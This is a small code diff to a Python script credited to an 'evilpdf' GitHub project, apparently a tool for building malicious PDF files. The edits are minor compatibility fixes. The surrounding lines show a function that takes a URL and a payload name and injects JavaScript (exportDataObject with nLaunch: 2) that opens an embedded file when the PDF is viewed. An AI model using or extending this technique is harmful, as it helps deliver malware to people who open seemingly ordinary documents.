@@ -4,7 +4,7 @@
 # github.com/thelinuxchoice/evilpdf
 
 import os, time, signal, sys
-from random import randint
+# from random import randint
 from PyPDF2 import PdfWriter, PdfReader
 
 try:
@@ -39,7 +39,7 @@ def create_pdf(url,pdf_name,payload_name):
  time.sleep(2)
  if pdf_name == "":
    pdf_name=open('adobe.pdf', 'rb')
- unmeta=PdfReader("%s" % (pdf_name), "rb")
+ unmeta=PdfReader("%s" % (pdf_name))
  meta=PdfWriter()
  meta.append_pages_from_reader(unmeta)
  meta.add_js('this.exportDataObject({ cName: "page.html", nLaunch: 2 });')
